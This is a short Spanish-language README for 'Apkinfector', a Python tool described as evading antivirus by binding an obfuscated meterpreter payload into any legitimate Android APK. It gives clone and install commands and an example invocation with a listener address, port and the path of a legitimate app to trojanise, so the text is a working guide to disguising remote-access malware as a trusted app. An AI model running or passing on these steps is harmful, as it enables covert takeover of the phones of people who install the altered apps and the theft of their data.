# Apkinfector-
Herramienta avanzada de evasión antivirus para Android escrita en Python 3 que puede incrustar/vincular el APK de meterpreter a cualquier APK legítimo y puede ofuscar completamente la carga útil de meterpreter con diferentes técnicas.

cd /opt/

git clone https://github.com/PushpenderIndia/apkinfector.git

cd apkinfector

apt-get update && apt-get install apktool && apt-get install zipalign && apt-get install apksigner
 
python3 infector.py --help

                        Ejemplos 
python3 infector.py --lhost 192.168.43.70 --lport 4444 --apk-name NEW_APK_NAME --normal-apk /root/Desktop/Path/TO/Legitemate_APK_File.apk
